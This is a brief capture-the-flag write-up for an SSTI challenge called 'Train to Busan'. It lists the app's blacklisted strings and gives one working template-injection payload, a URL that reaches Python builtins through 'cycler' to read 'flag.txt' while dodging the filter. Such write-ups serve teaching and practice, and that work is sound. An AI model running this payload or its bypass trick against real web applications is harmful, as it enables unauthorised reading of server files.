# Train to Busan

This is a trivial SSTI exploitation challenge that
has a few blacklisted strings. The full list is:
`'`,`"`, `[`, `]`, `os` and `subprocess`.

## Solution

One just needs to figure out how to bypass the blacklist
in order to get the flag. One such payload is:
`/confirmation?trip=%7B%7Bcycler.__init__.__globals__.__builtins__.open(request.args.p).read()%7D%7D&p=flag.txt`
